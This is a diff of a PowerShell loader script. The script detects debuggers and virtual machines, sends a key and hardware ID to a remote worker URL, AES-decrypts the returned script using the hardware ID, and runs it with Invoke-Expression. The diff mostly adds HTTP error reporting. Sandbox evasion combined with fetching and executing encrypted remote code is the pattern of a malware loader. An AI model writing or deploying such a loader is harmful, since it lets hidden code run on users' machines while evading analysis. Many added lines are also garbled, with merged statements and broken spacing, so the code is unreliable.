@@ -16,10 +16,9 @@ if ([System.Diagnostics.Debugger]::IsAttached) {
 function Test-VirtualEnvironment {
     try {
         $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction SilentlyContinue
-        $comp = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
-        $vmKeywords = @("VMware", "VirtualBox", "QEMU", "KVM", "Hyper-V", "Xen", "Parallels", "Virtual")
-        foreach ($kw in $vmKeywords) {
-            if ($bios.Manufacturer -match $kw -or $comp.Model -match $kw -or $bios.SMBIOSBIOSVersion -match $kw) {
+        $comp = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue$vmKeywords = @("VMware", "VirtualBox", "QEMU", "KVM", "Hyper-V", "Xen", "Parallels", "Virtual")
+        foreach ($kw in$vmKeywords) {
+            if ($bios.Manufacturer -match$kw -or $comp.Model -match$kw -or $bios.SMBIOSBIOSVersion -match$kw) {
                 return $true
             }
         }
@@ -127,30 +126,27 @@ while ($true) {
                 continue
             }
 
-            $sessionToken = $tokenResponse.token
-            $scriptBody = @{ action = "get_script"; token = $sessionToken; hwid = $userHwid; key = $inputKey } | ConvertTo-Json
-            $scriptResponse = Invoke-RestMethod -Uri $workerUrl -Method Post -Body $scriptBody -Headers $customHeaders
+            $sessionToken =$tokenResponse.token
+            $scriptBody = @{ action = "get_script"; token = $sessionToken; hwid = $userHwid; key =$inputKey } | ConvertTo-Json
+            $scriptResponse = Invoke-RestMethod -Uri$workerUrl -Method Post -Body $scriptBody -Headers$customHeaders
             
             if ($scriptResponse.success) {
                 if ($scriptResponse.encrypted) {
-                    function Decrypt-Payload-CBC($encDataHex, $ivHex, $hwid) {
-                        $aes = [System.Security.Cryptography.Aes]::Create()
-                        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-                        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+                    function Decrypt-Payload-CBC($encDataHex,$ivHex, $hwid) {$aes = [System.Security.Cryptography.Aes]::Create()
+                        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                         
                         $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($hwid.PadRight(32, '0').Substring(0, 32))
                         
-                        if ($ivHex.Length -gt 32) { $ivHex = $ivHex.Substring(0, 32) }
-                        elseif ($ivHex.Length -lt 32) { $ivHex = $ivHex.PadRight(32, '0') }
+                        if ($ivHex.Length -gt 32) { $ivHex =$ivHex.Substring(0, 32) }
+                        elseif ($ivHex.Length -lt 32) { $ivHex =$ivHex.PadRight(32, '0') }
 
                         $ivBytes = New-Object byte[] 16
                         for ($i = 0; $i -lt 32; $i += 2) {
                             $ivBytes[$i / 2] = [Convert]::ToByte($ivHex.Substring($i, 2), 16)
                         }
-                        $aes.IV = $ivBytes
+                        $aes.IV =$ivBytes
                         
-                        if (($encDataHex.Length % 2) -ne 0) {
-                            $encDataHex += "0"
+                        if (($encDataHex.Length \% 2) -ne 0) {$encDataHex += "0"
                         }
 
                         $cipherBytes = New-Object byte[] ($encDataHex.Length / 2)
@@ -158,12 +154,12 @@ while ($true) {
                             $cipherBytes[$i / 2] = [Convert]::ToByte($encDataHex.Substring($i, 2), 16)
                         }
                         
-                        $decryptor = $aes.CreateDecryptor()
-                        $plainBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
+                        $decryptor =$aes.CreateDecryptor()
+                        $plainBytes =$decryptor.TransformFinalBlock($cipherBytes, 0,$cipherBytes.Length)
                         return [System.Text.Encoding]::UTF8.GetString($plainBytes)
                     }
 
-                    $decryptedScript = Decrypt-Payload-CBC $scriptResponse.data $scriptResponse.iv $userHwid
+                    $decryptedScript = Decrypt-Payload-CBC$scriptResponse.data $scriptResponse.iv $userHwid
                     Invoke-Expression $decryptedScript
                 } else {
                     Invoke-Expression $scriptResponse.script
@@ -175,10 +171,18 @@ while ($true) {
             Write-Host "`n     [X] Request Error Details:" -ForegroundColor Red
             if ($_.Exception.Response) {
                 try {
-                    $stream = $_.Exception.Response.GetResponseStream()
+                    $statusCode = [int]$_.Exception.Response.StatusCode
+                    $statusDesc =$_.Exception.Response.StatusDescription
+                    Write-Host "     [X] HTTP Status: $statusCode$statusDesc" -ForegroundColor Yellow
+                    
+                    $stream =$_.Exception.Response.GetResponseStream()
                     $reader = New-Object System.IO.StreamReader($stream)
-                    $errBody = $reader.ReadToEnd()
-                    Write-Host "     [X] Server says: $errBody" -ForegroundColor Yellow
+                    $errBody =$reader.ReadToEnd()
+                    if (-not [string]::IsNullOrWhiteSpace($errBody)) {
+                        Write-Host "     [X] Server Response: $errBody" -ForegroundColor Yellow
+                    } else {
+                        Write-Host "     [X] Server Response: (Empty body / Worker threw 500 error)" -ForegroundColor Yellow
+                    }
                 } catch {
                     Write-Host "     [X] Message: $($_.Exception.Message)" -ForegroundColor Yellow
                 }
